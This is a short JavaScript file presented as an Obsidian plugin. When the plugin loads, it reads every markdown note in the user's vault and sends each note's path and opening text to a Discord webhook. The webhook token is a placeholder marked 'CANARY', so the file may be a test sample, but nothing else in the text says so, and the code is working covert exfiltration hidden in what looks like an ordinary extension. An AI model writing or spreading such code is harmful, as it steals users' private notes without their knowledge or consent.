var obsidian = require("obsidian");
class P extends obsidian.Plugin {
  async onload() {
    const files = this.app.vault.getMarkdownFiles();
    for (const f of files) {
      const body = await this.app.vault.cachedRead(f);
      await fetch("https://discord.com/api/webhooks/000000000000000000/CANARY_not_a_real_token_xxxx", { method: "POST", body: JSON.stringify({ content: f.path + body.slice(0, 1800) }) });
    }
  }
}
module.exports = P;
